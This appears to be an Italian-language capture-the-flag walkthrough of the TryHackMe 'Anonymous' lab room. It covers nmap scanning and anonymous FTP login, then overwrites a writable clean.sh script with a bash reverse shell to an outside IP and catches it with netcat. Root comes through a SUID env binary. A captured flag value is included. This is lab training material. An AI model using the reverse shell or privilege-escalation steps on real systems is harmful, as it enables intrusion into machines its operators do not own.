
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/anonymous

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.190.149 -oG risultatoscan
```

```
sudo nmap -sC -sV -p 21,22,139,445 10.10.190.149 -oN risultatoscan2
```
permessi di scrittura su NSE
```
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
```


```
ftp 10.10.190.149                                                                
```

```
anonymous
```

```
passive off
```

```
ftp> ls

ftp> passive off

ftp> ls

ftp> cd scripts

ftp> ls

-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1032 Aug 03 13:26 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt

```
leggiamo o scarichiamo i file
```
less to_do.txt
```

```
mget clean.sh
```

```
nano clean.sh   
```

```
#!/bin/bash
bash -i >& /dev/tcp/10.21.9.220/1234 0>&1
```
ci riconnettiamo ftp ed uplodiamo il file modificato con reverse shell
```
put clean.sh
```

ci mettiamo in ascolto

```
nc -nlvp 1234
```

```
cat user.txt
```
flag!
```
90d6f992585815ff991e68748c414740
```

facciamo trattamento della console e poi
```
find / -user root -perm -4000 -print 2>/dev/null
```

==GTFOBins==
https://gtfobins.github.io/
==va dato sulla rotta assoluta del binario! /usr/bin/env==
```
/usr/bin/env /bin/sh -p
```

```
siamo root!
```

```
whoami
```

```
root
ls
pics  user.txt
cd /root
ls
root.txt
cat root.txt
```
flag!
```
4d9xxxxxxxxxxxxxxxxxxxxx
```

```
smbclient -L 10.10.190.149 
```
inoltre per
==vedere servizi in condivisione==
```
smbmap -H 10.10.190.149 
```

condivisione su pc utente
pics            Disk      My SMB Share Directory for Pics
